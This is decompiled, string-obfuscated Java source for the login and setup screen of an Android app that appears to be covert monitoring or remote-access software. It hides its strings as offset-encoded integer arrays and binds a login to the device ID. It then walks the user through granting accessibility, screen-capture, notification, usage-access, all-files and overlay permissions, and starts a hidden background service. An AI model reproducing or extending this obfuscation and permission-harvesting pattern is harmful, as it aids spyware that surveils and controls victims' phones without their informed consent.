package tev.piqgahor;
public class omxcjy744W extends android.app.Activity {
    private static final String USER_HARDCODE;
    private static final boolean hsfR1lU85no3;
    private tev.piqgahor.omxcjy744W$MyHandler GtuMDdI657;
    private String YNyyhsT69;
    private boolean dacaFmKg7020;
    private int wkrQ7654;

    static omxcjy744W()
    {
        tev.piqgahor.omxcjy744W.USER_HARDCODE = 0;
        boolean v0_2 = new int[8];
        v0_2 = {13, 128, 110, 122, 128, 130, 123, 116};
        tev.piqgahor.omxcjy744W.hsfR1lU85no3 = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_2).equalsIgnoreCase(android.os.Build.MANUFACTURER);
        return;
    }

    public omxcjy744W()
    {
        this.wkrQ7654 = 0;
        return;
    }

    private static void E8RiYuu(android.widget.TextView p1)
    {
        p1.setMovementMethod(android.text.method.LinkMovementMethod.getInstance());
        return;
    }

    private void KrJVkLVo67(String p7, String p8, String p9)
    {
        android.content.Context v0 = this.getApplicationContext();
        android.content.Intent v1_1 = new android.content.Intent(v0, tev.piqgahor.ttnC03lWapO);
        int v3_2 = new int[6];
        v3_2 = {23, 131, 134, 126, 128, 133};
        v1_1.putExtra(tev.piqgahor.jzVO9lP4.gg6NkF2pzSP, tev.piqgahor.WqukitNJL.ZkeTGysUO016(v3_2));
        String v2_0 = new int[6];
        v2_0 = {23, 131, 134, 126, 128, 133};
        v1_1.putExtra(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v2_0), p7);
        String v2_3 = new int[11];
        v2_3 = {30, 127, 129, 129, 131, 145, 145, 125, 137, 131, 151};
        v1_1.putExtra(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v2_3), p8);
        String v2_5 = new int[7];
        v2_5 = {9, 109, 110, 127, 104, 114, 109};
        v1_1.putExtra(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v2_5), p9);
        String v2_7 = new int[7];
        v2_7 = {21, 135, 122, 136, 138, 129, 137};
        v1_1.putExtra(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v2_7), 1);
        v0.startService(v1_1);
        return;
    }

    static synthetic String access$0()
    {
        return tev.piqgahor.omxcjy744W.USER_HARDCODE;
    }

    static synthetic void access$1(tev.piqgahor.omxcjy744W p0, String p1, String p2, String p3)
    {
        p0.KrJVkLVo67(p1, p2, p3);
        return;
    }

    private void hHQDdgL1076(android.content.Context p26)
    {
        if (this.wkrQ7654 != 3) {
            int v8;
            int v11 = tev.piqgahor.mlDMsT43cl.xXgSuZwrVM88263(p26);
            if ((v11 & 2) != 2) {
                v8 = 0;
            } else {
                v8 = 1;
            }
            int v10;
            if ((v11 & 4) != 4) {
                v10 = 0;
            } else {
                v10 = 1;
            }
            int v7;
            if ((v11 & 8) != 8) {
                v7 = 0;
            } else {
                v7 = 1;
            }
            int v9;
            if ((v11 & 16) != 16) {
                v9 = 0;
            } else {
                v9 = 1;
            }
            int v20;
            if ((v11 & 32) != 32) {
                v20 = 0;
            } else {
                v20 = 1;
            }
            int v18;
            if ((v11 & 64) != 64) {
                v18 = 0;
            } else {
                v18 = 1;
            }
            int v4;
            if ((v11 & 128) != 128) {
                v4 = 0;
            } else {
                v4 = 1;
            }
            int v19;
            if ((v11 & 256) != 256) {
                v19 = 0;
            } else {
                v19 = 1;
            }
            if ((v8 != 0) || ((v10 != 0) || ((v7 != 0) || ((v9 != 0) || ((v20 != 0) || ((v18 != 0) || (v19 != 0))))))) {
                int v15 = 1;
            } else {
                v15 = 0;
            }
            android.widget.TextView v13_1 = ((android.widget.TextView) this.findViewById(2131230721));
            if (v15 == 0) {
                v13_1.setText(this.getString(2131099654));
            } else {
                v13_1.setText(this.getString(2131099655));
            }
            if ((v15 == 0) && (this.wkrQ7654 == 4)) {
                this.wlWiGSVH3310(this.getString(2131099657), 1);
            }
            int v23_4;
            android.widget.Button v21_0 = this.findViewById(2131230722);
            if (v8 == 0) {
                v23_4 = 8;
            } else {
                v23_4 = 0;
            }
            int v23_6;
            ((android.widget.Button) v21_0).setVisibility(v23_4);
            android.widget.Button v5_0 = this.findViewById(2131230723);
            if (v10 == 0) {
                v23_6 = 8;
            } else {
                v23_6 = 0;
            }
            int v23_8;
            ((android.widget.Button) v5_0).setVisibility(v23_6);
            android.widget.Button v14_0 = this.findViewById(2131230724);
            if (v7 == 0) {
                v23_8 = 8;
            } else {
                v23_8 = 0;
            }
            int v23_10;
            ((android.widget.Button) v14_0).setVisibility(v23_8);
            android.widget.Button v16_0 = this.findViewById(2131230725);
            if (v9 == 0) {
                v23_10 = 8;
            } else {
                v23_10 = 0;
            }
            int v23_13;
            ((android.widget.Button) v16_0).setVisibility(v23_10);
            android.widget.Button v17_0 = this.findViewById(2131230726);
            if (v20 == 0) {
                v23_13 = 8;
            } else {
                v23_13 = 0;
            }
            int v23_15;
            ((android.widget.Button) v17_0).setVisibility(v23_13);
            android.widget.Button v22_0 = this.findViewById(2131230727);
            if (v18 == 0) {
                v23_15 = 8;
            } else {
                v23_15 = 0;
            }
            int v23_17;
            ((android.widget.Button) v22_0).setVisibility(v23_15);
            android.widget.Button v12_0 = this.findViewById(2131230728);
            if (v4 == 0) {
                v23_17 = 8;
            } else {
                v23_17 = 0;
            }
            ((android.widget.Button) v12_0).setVisibility(v23_17);
            if (android.os.Build$VERSION.SDK_INT >= 21) {
                ((android.widget.Button) this.findViewById(2131230737)).setVisibility(0);
            }
            int v23_23;
            android.widget.Button v6_0 = this.findViewById(2131230729);
            if (v19 == 0) {
                v23_23 = 8;
            } else {
                v23_23 = 0;
            }
            ((android.widget.Button) v6_0).setVisibility(v23_23);
        }
        return;
    }

    private void qmJVl3(String p6, String p7)
    {
        try {
            android.app.AlertDialog$Builder v1_1 = new android.app.AlertDialog$Builder(this);
            v1_1.setTitle(p6).setMessage(p7).setIcon(2130837506).setCancelable(0).setNegativeButton("OK", new tev.piqgahor.omxcjy744W$1(this));
            v1_1.create().show();
        } catch (Exception v2) {
        }
        return;
    }

    private void rDpQRUHxV465()
    {
        android.content.Context v0 = this.getApplicationContext();
        String v1_1 = new int[20];
        v1_1 = {46, 154, 157, 149, 151, 156, 141, 165, 156, 146, 141, 144, 162, 156, 141, 145, 154, 151, 145, 153};
        tev.piqgahor.jzVO9lP4.yStpazw33441uh(v0, tev.piqgahor.WqukitNJL.ZkeTGysUO016(v1_1));
        return;
    }

    private void wlWiGSVH3310(String p2)
    {
        this.wlWiGSVH3310(p2, 0);
        return;
    }

    private void wlWiGSVH3310(String p5, boolean p6)
    {
        try {
            android.widget.Toast v1 = android.widget.Toast.makeText(this, p5, 1);
        } catch (int v2) {
            return;
        }
        if (android.os.Build$VERSION.SDK_INT < 30) {
            int v2_1;
            android.widget.TextView v0_0 = v1.getView().findViewById(16908299);
            if (!p6) {
                v2_1 = -65536;
            } else {
                v2_1 = -16711936;
            }
            ((android.widget.TextView) v0_0).setTextColor(v2_1);
        }
        v1.show();
        return;
    }

    public void DcMNef7519(android.view.View p5)
    {
        this.rDpQRUHxV465();
        String v0_3 = new int[44];
        v0_3 = {26, 117, 102, 137, 129, 131, 136, 113, 136, 126, 119, 58, 105, 136, 92, 142, 136, 106, 127, 140, 135, 131, 141, 141, 131, 137, 136, 91, 125, 125, 127, 141, 141, 131, 124, 131, 134, 131, 142, 147, 58, 59, 59, 59};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_3));
        tev.piqgahor.mlDMsT43cl.WufblLAypC639(this, 3);
        String v0_0 = new Object[4];
        v0_0[0] = this.getString(2131099672);
        v0_0[1] = " \"";
        v0_0[2] = this.getString(2131099648);
        v0_0[3] = "\"";
        this.wlWiGSVH3310(tev.piqgahor.WqukitNJL.mvoGCr4741(v0_0));
        return;
    }

    public void ExCYyzv65(android.view.View p15)
    {
        if (!this.dacaFmKg7020) {
            this.dacaFmKg7020 = 1;
            android.widget.EditText v3_1 = ((android.widget.EditText) this.findViewById(2131230731));
            String v6_8 = new int[21];
            v6_8 = {19, 110, 95, 130, 122, 124, 129, 106, 129, 119, 112, 51, 98, 129, 95, 130, 122, 124, 129, 77, 51};
            tev.piqgahor.WqukitNJL.VkNmRD0688(new StringBuilder(String.valueOf(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v6_8))).append(v3_1.getText().toString()).toString());
            if (!v3_1.getText().toString().isEmpty()) {
                android.content.Context v4 = this.getApplicationContext();
                if (tev.piqgahor.bv55a2UiI.AuAjVO68Sr617(v4)) {
                    this.YNyyhsT69 = tev.piqgahor.zyk1Rb03U.vnatrZ170(v4);
                    int v0 = v3_1.getText().toString();
                    String v5_36 = new int[6];
                    v5_36 = {45, 142, 145, 154, 150, 155};
                    if (!v0.equalsIgnoreCase(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_36))) {
                        String v5_41 = new int[7];
                        v5_41 = {16, 113, 116, 125, 121, 126, 80};
                        if (v0.equalsIgnoreCase(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_41))) {
                            String v5_44 = new int[6];
                            v5_44 = {20, 117, 120, 129, 125, 130};
                            v0 = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_44);
                        }
                        String v1 = tev.piqgahor.zyk1Rb03U.mJgmu9fm(v4);
                        int v2_1 = new tev.piqgahor.oSNRG2D81(tev.piqgahor.bv55a2UiI.oeXvCkln32(v0, v1, this.YNyyhsT69, tev.piqgahor.zyk1Rb03U.zKPvcvO8T8t(v4).replaceAll("\'", "")));
                        if (v2_1.dDZB7fapAJ()) {
                            if (v2_1.uMhxguUWZsDD9()) {
                                String v6_27 = new int[33];
                                v6_27 = {8, 99, 84, 119, 111, 113, 118, 95, 118, 108, 101, 40, 87, 118, 84, 119, 111, 113, 118, 40, 77, 90, 90, 87, 90, 52, 40, 117, 123, 111, 40, 69, 40};
                                tev.piqgahor.WqukitNJL.VkNmRD0688(new StringBuilder(String.valueOf(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v6_27))).append(v2_1.oPtvsOY5gy8sG()).toString());
                                String v5_1 = new int[16];
                                v5_1 = {26, 91, 136, 126, 140, 137, 131, 126, 58, 103, 137, 136, 131, 142, 137, 140};
                                this.qmJVl3(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_1), v2_1.oPtvsOY5gy8sG());
                            } else {
                                this.KrJVkLVo67(v0, v2_1.nTbq3m5bHL0(), v1);
                                android.widget.Toast.makeText(this, this.getString(2131099681), 0).show();
                                String v5_8 = new Object[6];
                                String v6_2 = new int[37];
                                v6_2 = {49, 140, 125, 160, 152, 154, 159, 136, 159, 149, 142, 81, 128, 159, 125, 160, 152, 154, 159, 81, 128, 124, 93, 81, 146, 148, 148, 150, 164, 164, 144, 156, 150, 170, 81, 110, 81};
                                v5_8[0] = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v6_2);
                                v5_8[1] = v2_1.nTbq3m5bHL0();
                                String v7_1 = new int[15];
                                v7_1 = {50, 94, 82, 165, 151, 149, 167, 164, 151, 145, 155, 150, 82, 111, 82};
                                v5_8[2] = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v7_1);
                                v5_8[3] = this.YNyyhsT69;
                                String v7_4 = new int[12];
                                v7_4 = {39, 83, 71, 139, 140, 157, 134, 144, 139, 71, 100, 71};
                                v5_8[4] = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v7_4);
                                v5_8[5] = v1;
                                tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.mvoGCr4741(v5_8));
                                tev.piqgahor.uhvpCP9tsX.StartThread(new tev.piqgahor.omxcjy744W$CheckLoginRunnable(tev.piqgahor.zyk1Rb03U.mJgmu9fm(v4), this.YNyyhsT69, this.GtuMDdI657, 0));
                            }
                            this.dacaFmKg7020 = 0;
                        } else {
                            this.dacaFmKg7020 = 0;
                            String v5_13 = new int[38];
                            v5_13 = {13, 104, 89, 124, 116, 118, 123, 100, 123, 113, 106, 45, 92, 123, 89, 124, 116, 118, 123, 45, 82, 95, 95, 92, 95, 57, 45, 127, 114, 129, 45, 118, 128, 45, 123, 130, 121, 121};
                            tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_13));
                            String v5_15 = new int[16];
                            v5_15 = {7, 72, 117, 107, 121, 118, 112, 107, 39, 84, 118, 117, 112, 123, 118, 121};
                            String v5_16 = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_15);
                            String v6_14 = new int[35];
                            v6_14 = {10, 79, 124, 124, 121, 124, 42, 109, 121, 120, 120, 111, 109, 126, 115, 121, 120, 54, 42, 122, 118, 111, 107, 125, 111, 42, 126, 124, 131, 42, 118, 107, 126, 111, 124};
                            this.qmJVl3(v5_16, tev.piqgahor.WqukitNJL.ZkeTGysUO016(v6_14));
                        }
                    } else {
                        this.dacaFmKg7020 = 0;
                        String v5_17 = new int[16];
                        v5_17 = {7, 72, 117, 107, 121, 118, 112, 107, 39, 84, 118, 117, 112, 123, 118, 121};
                        String v5_18 = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_17);
                        String v6_16 = new int[12];
                        v6_16 = {51, 138, 165, 162, 161, 154, 83, 120, 160, 148, 156, 159};
                        this.qmJVl3(v5_18, tev.piqgahor.WqukitNJL.ZkeTGysUO016(v6_16));
                    }
                } else {
                    this.dacaFmKg7020 = 0;
                    String v5_20 = new int[40];
                    v5_20 = {45, 136, 121, 156, 148, 150, 155, 132, 155, 145, 138, 77, 124, 155, 121, 156, 148, 150, 155, 77, 128, 120, 118, 125, 77, 78, 78, 78, 77, 123, 156, 77, 150, 155, 161, 146, 159, 155, 146, 161};
                    tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_20));
                    String v5_22 = new int[16];
                    v5_22 = {14, 79, 124, 114, 128, 125, 119, 114, 46, 91, 125, 124, 119, 130, 125, 128};
                    String v5_23 = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_22);
                    String v6_20 = new int[23];
                    v6_20 = {38, 116, 149, 70, 143, 148, 154, 139, 152, 148, 139, 154, 70, 137, 149, 148, 148, 139, 137, 154, 143, 149, 148};
                    this.qmJVl3(v5_23, tev.piqgahor.WqukitNJL.ZkeTGysUO016(v6_20));
                }
            } else {
                this.dacaFmKg7020 = 0;
                String v5_25 = new int[12];
                v5_25 = {52, 121, 162, 168, 153, 166, 84, 153, 161, 149, 157, 160};
                android.widget.Toast.makeText(this, tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_25), 0).show();
            }
        }
        return;
    }

    public void FMxwd8fnD5r(android.view.View p3)
    {
        this.rDpQRUHxV465();
        String v0_3 = new int[36];
        v0_3 = {12, 103, 88, 123, 115, 117, 122, 99, 122, 112, 105, 44, 91, 122, 78, 128, 122, 92, 113, 126, 121, 117, 127, 127, 117, 123, 122, 77, 112, 121, 117, 122, 44, 45, 45, 45};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_3));
        tev.piqgahor.mlDMsT43cl.oDEVcvNbIf(this, 0, 1);
        this.wlWiGSVH3310(this.getString(2131099670));
        return;
    }

    public void KOwRgk14(android.view.View p7)
    {
        this.rDpQRUHxV465();
        if (tev.piqgahor.mlDMsT43cl.Ng3gLl8Na(this, 1024)) {
            if (!tev.piqgahor.omxcjy744W.hsfR1lU85no3) {
                String v0_1 = new Object[4];
                v0_1[0] = this.getString(2131099679);
                v0_1[1] = " \"";
                v0_1[2] = this.getString(2131099648);
                v0_1[3] = "\"";
                this.wlWiGSVH3310(tev.piqgahor.WqukitNJL.mvoGCr4741(v0_1));
            } else {
                String v0_3 = new Object[4];
                v0_3[0] = this.getString(2131099680);
                v0_3[1] = " \"";
                v0_3[2] = this.getString(2131099648);
                v0_3[3] = "\"";
                this.wlWiGSVH3310(tev.piqgahor.WqukitNJL.mvoGCr4741(v0_3));
            }
        }
        return;
    }

    public void OnBtnManageAllFilesPermission(android.view.View p2)
    {
        this.rDpQRUHxV465();
        String v0_2 = new int[30];
        v0_2 = {52, 131, 162, 118, 168, 162, 129, 149, 162, 149, 155, 153, 117, 160, 160, 122, 157, 160, 153, 167, 132, 153, 166, 161, 157, 167, 167, 157, 163, 162};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_2));
        tev.piqgahor.mlDMsT43cl.ShowManageAppAllFilesPermission(this);
        this.wlWiGSVH3310(this.getString(2131099676));
        return;
    }

    public void OnGPFalse()
    {
        int v1_1 = new int[25];
        v1_1 = {3, 94, 79, 114, 106, 108, 113, 90, 113, 103, 96, 35, 82, 113, 74, 83, 73, 100, 111, 118, 104, 35, 36, 36, 36};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v1_1));
        ((android.widget.Button) this.findViewById(2131230737)).setVisibility(8);
        return;
    }

    public void OnGPTrue()
    {
        int v1_1 = new int[24];
        v1_1 = {35, 126, 111, 146, 138, 140, 145, 122, 145, 135, 128, 67, 114, 145, 106, 115, 119, 149, 152, 136, 67, 68, 68, 68};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v1_1));
        ((android.widget.Button) this.findViewById(2131230737)).setVisibility(0);
        return;
    }

    public void SosfGx179(android.view.View p4)
    {
        this.rDpQRUHxV465();
        String v1_5 = new int[50];
        v1_5 = {42, 133, 118, 153, 145, 147, 152, 129, 152, 142, 135, 74, 121, 152, 108, 158, 152, 108, 139, 158, 158, 143, 156, 163, 121, 154, 158, 147, 151, 147, 164, 139, 158, 147, 153, 152, 122, 143, 156, 151, 147, 157, 157, 147, 153, 152, 74, 75, 75, 75};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v1_5));
        if (android.os.Build$VERSION.SDK_INT >= 23) {
            tev.piqgahor.mlDMsT43cl.wkmYRiyaM1081(this, this.getPackageName());
            int v0 = 0;
            while (v0 < 2) {
                this.wlWiGSVH3310(this.getString(2131099675));
                v0++;
            }
        }
        return;
    }

    public void TPrpdXvBAMA02(android.view.View p2)
    {
        this.rDpQRUHxV465();
        String v0_2 = new int[32];
        v0_2 = {18, 109, 94, 129, 121, 123, 128, 105, 128, 118, 111, 50, 97, 128, 84, 134, 128, 83, 130, 130, 101, 119, 134, 134, 123, 128, 121, 133, 50, 51, 51, 51};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_2));
        tev.piqgahor.mlDMsT43cl.YBdupZdxIZq(this);
        this.wlWiGSVH3310(this.getString(2131099677));
        return;
    }

    public void VOYRWpahyd4493(android.view.View p2)
    {
        this.rDpQRUHxV465();
        String v0_2 = new int[37];
        v0_2 = {21, 112, 97, 132, 124, 126, 131, 108, 131, 121, 114, 53, 100, 131, 87, 137, 131, 101, 122, 135, 130, 126, 136, 136, 126, 132, 131, 104, 120, 135, 122, 122, 131, 53, 54, 54, 54};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_2));
        tev.piqgahor.mlDMsT43cl.ShowScreenPermissionWnd(this);
        this.wlWiGSVH3310(this.getString(2131099673));
        return;
    }

    public void YNdQgPkt14(android.view.View p2)
    {
        this.rDpQRUHxV465();
        String v0_2 = new int[42];
        v0_2 = {5, 96, 81, 116, 108, 110, 115, 92, 115, 105, 98, 37, 84, 115, 71, 121, 115, 88, 126, 120, 121, 106, 114, 70, 113, 106, 119, 121, 85, 106, 119, 114, 110, 120, 120, 110, 116, 115, 37, 38, 38, 38};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_2));
        tev.piqgahor.mlDMsT43cl.XMVBy255Nm1zq3(this, 4);
        this.wlWiGSVH3310(this.getString(2131099674));
        return;
    }

    public void jQrgDbES68118(android.view.View p5)
    {
        this.rDpQRUHxV465();
        String v0_3 = new int[37];
        v0_3 = {16, 107, 92, 127, 119, 121, 126, 103, 126, 116, 109, 48, 95, 126, 82, 132, 126, 96, 117, 130, 125, 121, 131, 131, 121, 127, 126, 94, 127, 132, 121, 118, 137, 48, 49, 49, 49};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_3));
        tev.piqgahor.mlDMsT43cl.ShowNotyfyWindow(this, 3);
        String v0_0 = new Object[4];
        v0_0[0] = this.getString(2131099672);
        v0_0[1] = " \"";
        v0_0[2] = this.getString(2131099648);
        v0_0[3] = "\"";
        this.wlWiGSVH3310(tev.piqgahor.WqukitNJL.mvoGCr4741(v0_0));
        return;
    }

    protected void onCreate(android.os.Bundle p27)
    {
        this = super.onCreate(p27);
        void v0_54 = new int[18];
        String v23_66 = v0_54;
        v23_66 = {9, 100, 85, 120, 112, 114, 119, 96, 119, 109, 102, 41, 76, 123, 110, 106, 125, 110};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v23_66));
        this.dacaFmKg7020 = 0;
        if (tev.piqgahor.ttnC03lWapO.xJGBk169) {
            this.getWindow().setFlags(2621440, 6815744);
            this.setContentView(2130903040);
            android.widget.TextView v16_1 = ((android.widget.TextView) this.findViewById(2131230739));
            if (android.os.Build$VERSION.SDK_INT < 24) {
                v16_1.setVisibility(8);
            } else {
                tev.piqgahor.omxcjy744W.E8RiYuu(v16_1);
            }
            String v23_67 = new tev.piqgahor.omxcjy744W$MyHandler;
            v23_67(this, android.os.Looper.getMainLooper());
            this.GtuMDdI657 = v23_67;
            android.content.Intent v5 = this.getIntent();
            if (v5 != null) {
                this.wkrQ7654 = v5.getIntExtra("t", 0);
            }
            if (this.wkrQ7654 == 0) {
                this.wkrQ7654 = 1;
            }
            android.widget.Button v15_1 = ((android.widget.Button) this.findViewById(2131230735));
            android.widget.Button v10_1 = ((android.widget.Button) this.findViewById(2131230736));
            android.widget.Button v6_1 = ((android.widget.Button) this.findViewById(2131230737));
            if (this.wkrQ7654 != 3) {
                if ((android.os.Build$VERSION.SDK_INT > 16) && (this.wkrQ7654 == 1)) {
                    ((android.widget.TextView) this.findViewById(2131230734)).setVisibility(0);
                }
                if (android.os.Build$VERSION.SDK_INT >= 23) {
                    v10_1.setVisibility(0);
                }
                if (tev.piqgahor.mlDMsT43cl.BkuC6uMHu4(this)) {
                    v15_1.setVisibility(0);
                    if (tev.piqgahor.omxcjy744W.hsfR1lU85no3) {
                        v15_1.setText(this.getString(2131099669));
                    }
                }
                this.hHQDdgL1076(this.getApplicationContext());
                if ((this.wkrQ7654 != 2) && (android.os.Build$VERSION.SDK_INT >= 21)) {
                    void v0_17 = new int[16];
                    String v23_16 = v0_17;
                    v23_16 = {29, 94, 139, 129, 143, 140, 134, 129, 61, 106, 140, 139, 134, 145, 140, 143};
                    this.qmJVl3(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v23_16), this.getString(2131099686));
                }
                if ((this.wkrQ7654 == 1) && (tev.piqgahor.zyk1Rb03U.pK39FwwYsRR())) {
                    void v0_24 = new int[16];
                    String v23_21 = v0_24;
                    v23_21 = {29, 94, 139, 129, 143, 140, 134, 129, 61, 106, 140, 139, 134, 145, 140, 143};
                    this.qmJVl3(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v23_21), this.getString(2131099682));
                }
                if (this.wkrQ7654 == 2) {
                    void v0_32 = new int[16];
                    String v23_26 = v0_32;
                    v23_26 = {7, 72, 117, 107, 121, 118, 112, 107, 39, 84, 118, 117, 112, 123, 118, 121};
                    this.qmJVl3(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v23_26), this.getString(2131099688));
                }
            } else {
                void v0_37 = new int[4];
                String v23_29 = v0_37;
                v23_29 = {49, 158, 164, 152};
                String v19 = v5.getStringExtra(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v23_29));
                void v0_40 = new Object[2];
                String v23_32 = v0_40;
                void v0_42 = new int[25];
                String v25_2 = v0_42;
                v25_2 = {46, 137, 122, 157, 149, 151, 156, 133, 156, 146, 139, 78, 129, 150, 157, 165, 78, 123, 129, 117, 78, 79, 79, 79, 78};
                v23_32[0] = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v25_2);
                v23_32[1] = v19;
                tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.mvoGCr4741(v23_32));
                ((android.widget.Button) this.findViewById(2131230722)).setVisibility(8);
                ((android.widget.Button) this.findViewById(2131230723)).setVisibility(8);
                ((android.widget.Button) this.findViewById(2131230724)).setVisibility(8);
                ((android.widget.Button) this.findViewById(2131230725)).setVisibility(8);
                ((android.widget.Button) this.findViewById(2131230726)).setVisibility(8);
                ((android.widget.Button) this.findViewById(2131230727)).setVisibility(8);
                ((android.widget.Button) this.findViewById(2131230728)).setVisibility(8);
                ((android.widget.EditText) this.findViewById(2131230731)).setVisibility(8);
                ((android.widget.TextView) this.findViewById(2131230732)).setVisibility(8);
                ((android.widget.Button) this.findViewById(2131230733)).setVisibility(8);
                v15_1.setVisibility(8);
                v10_1.setVisibility(8);
                v6_1.setVisibility(8);
                ((android.widget.TextView) this.findViewById(2131230721)).setText(v19);
            }
        } else {
            void v0_70 = new int[29];
            String v23_62 = v0_70;
            v23_62 = {10, 101, 86, 121, 113, 115, 120, 97, 120, 110, 103, 42, 94, 124, 131, 42, 125, 126, 107, 124, 126, 42, 125, 111, 124, 128, 115, 109, 111};
            tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v23_62));
            android.content.Context v4 = this.getApplicationContext();
            int v17 = new android.content.Intent;
            v17(v4, tev.piqgahor.ttnC03lWapO);
            void v0_74 = new int[20];
            String v24_17 = v0_74;
            v24_17 = {47, 155, 158, 150, 152, 157, 142, 166, 157, 147, 142, 157, 148, 148, 147, 142, 158, 159, 148, 157};
            v17.putExtra(tev.piqgahor.jzVO9lP4.gg6NkF2pzSP, tev.piqgahor.WqukitNJL.ZkeTGysUO016(v24_17));
            try {
                v4.startService(v17);
            } catch (String v23) {
            }
            this.finish();
        }
        return;
    }

    public void onDestroy()
    {
        String v0_1 = new int[19];
        v0_1 = {32, 123, 108, 143, 135, 137, 142, 119, 142, 132, 125, 64, 100, 133, 147, 148, 146, 143, 153};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_1));
        super.onDestroy();
        return;
    }

    public void onResume()
    {
        super.onResume();
        this.hHQDdgL1076(this.getApplicationContext());
        return;
    }

    protected void onStart()
    {
        super.onStart();
        String v1_2 = new int[19];
        v1_2 = {36, 127, 112, 147, 139, 141, 146, 123, 146, 136, 129, 68, 147, 146, 119, 152, 133, 150, 152};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v1_2));
        if (this.wkrQ7654 != 2) {
            String v1_4;
            android.content.Context v0 = this.getApplicationContext();
            this.YNyyhsT69 = tev.piqgahor.zyk1Rb03U.vnatrZ170(v0);
            String v3 = tev.piqgahor.zyk1Rb03U.mJgmu9fm(v0);
            String v4 = this.YNyyhsT69;
            tev.piqgahor.omxcjy744W$MyHandler v5 = this.GtuMDdI657;
            if (tev.piqgahor.omxcjy744W.USER_HARDCODE != null) {
                v1_4 = tev.piqgahor.zyk1Rb03U.zKPvcvO8T8t(v0);
            } else {
                v1_4 = 0;
            }
            tev.piqgahor.uhvpCP9tsX.StartThread(new tev.piqgahor.omxcjy744W$CheckLoginRunnable(v3, v4, v5, v1_4));
        }
        return;
    }

    public void sAe87335(android.view.View p5)
    {
        this.rDpQRUHxV465();
        SecurityException v0_5 = new int[36];
        v0_5 = {14, 105, 90, 125, 117, 119, 124, 101, 124, 114, 107, 46, 93, 124, 80, 130, 124, 94, 115, 128, 123, 119, 129, 129, 119, 125, 124, 99, 129, 111, 117, 115, 46, 47, 47, 47};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_5));
        if (android.os.Build$VERSION.SDK_INT > 20) {
            try {
                this.startActivityForResult(new android.content.Intent("android.settings.USAGE_ACCESS_SETTINGS"), 2);
            } catch (SecurityException v0) {
            } catch (SecurityException v0) {
            }
        }
        SecurityException v0_3 = new Object[4];
        v0_3[0] = this.getString(2131099671);
        v0_3[1] = " \"";
        v0_3[2] = this.getString(2131099648);
        v0_3[3] = "\"";
        this.wlWiGSVH3310(tev.piqgahor.WqukitNJL.mvoGCr4741(v0_3));
        return;
    }

    public void yiUgBt9A(android.view.View p2)
    {
        String v0_1 = new int[34];
        v0_1 = {48, 139, 124, 159, 151, 153, 158, 135, 158, 148, 141, 80, 127, 158, 114, 164, 158, 119, 159, 159, 151, 156, 149, 128, 162, 159, 164, 149, 147, 164, 80, 81, 81, 81};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_1));
        tev.piqgahor.mlDMsT43cl.aznIyuBf5Ira(this);
        this.wlWiGSVH3310(this.getString(2131099678));
        return;
    }
}
